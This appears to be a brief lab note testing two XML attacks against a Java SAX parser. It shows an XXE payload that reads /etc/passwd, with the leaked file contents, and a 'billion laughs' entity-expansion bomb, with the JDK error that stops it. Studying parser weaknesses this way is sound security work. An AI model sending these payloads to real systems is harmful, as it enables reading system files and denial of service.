XML Attacks for SAX Parsers
-------------------------------------------------------------------------------

XXL EXternal Entity Attack (XXE)
-------------------------------------------------------------------------------

Example:

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
<SessionRoot>
    <Sessions>
        <Session id="one" valid="true"/>
        <Session id="two" valid="false" />
    </Sessions>    
    <Hack>&xxe;</Hack>
</SessionRoot>

=> Is working!!

<SessionRoot>
    <Sessions>
        <Sessionid=one valid=true ></Session>

        <Sessionid=two valid=false ></Session>

    </Sessions>

    <Hack>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
...
student:x:1000:1000:student:/home/student:/bin/bash
vboxadd:x:986:1::/var/run/vboxadd:/bin/false
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
sphinx:x:985:977:Sphinx Search:/usr/lib/tmpfiles.d/lib/sphinx:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
</Hack>

</SessionRoot>


XML Bomb
-------------------------------------------------------------------------------

Example:
	<!DOCTYPE lolz [
	  <!ENTITY lol "lol">
	  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
	  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
	  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
	  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
	  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
	  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
	  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
	  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
	]>
	<lolz>&lol9;</lolz>

=> Doesn't work in a JDK > 1.4
	"The parser has encountered more than "64,000" entity expansions in this document..."

org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 1;
JAXP00010001: The parser has encountered more than "64000" entity expansions
in this document; this is the limit imposed by the JDK.


Resources:
-------------------------------------------------------------------------------
http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html

